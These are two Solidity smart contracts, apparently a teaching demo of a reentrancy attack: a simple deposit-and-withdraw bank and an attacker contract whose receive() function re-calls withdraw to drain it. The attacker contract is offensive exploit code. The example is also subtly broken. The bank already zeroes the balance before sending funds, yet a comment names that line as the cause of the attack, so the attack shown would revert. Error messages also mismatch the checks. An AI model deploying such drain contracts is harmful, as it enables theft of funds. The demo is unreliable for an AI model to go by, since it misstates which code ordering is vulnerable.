// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.2 <0.9.0;


contract Thebank{
    mapping (address => uint) public funders;

    function deposit() payable public {
          require(msg.value >= 1 ether, "cannot deposit below 100 wei");
          funders[msg.sender] += msg.value;

    }



    function witdraw() public payable  {

         uint balance=funders[msg.sender];
         require(balance >= 1 ether, "cannot deposit below 100 wei");
         funders[msg.sender]=0; //reasom for reentarcy attack 



         (bool success,)=msg.sender.call{value:balance}("");
         require(success, "transaction failed");


         //update the balance ;


             
    }

     function totalBalance() public view returns (uint) {
        return address(this).balance;
    }


       

}




you can write it in another file i.e Attacker.sol

// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.2 <0.9.0;

import './Thebanker.sol';




contract attacker{
    Thebank public thebank; //instance 
    mapping(address => uint) public balances;

    constructor(address _thebankAddress) {
        thebank = Thebank(_thebankAddress);
    }

    receive() external payable {
            if (address(thebank).balance >= 1 ether) {
            thebank.witdraw();
        }
     }

    
    function attack() public payable   {
        require(msg.value >= 1 ether);
        thebank.deposit{value: 1 ether}();
        thebank.witdraw();
    }

      function getBalances() public view returns (uint) {
        return address(this).balance;
    }



}











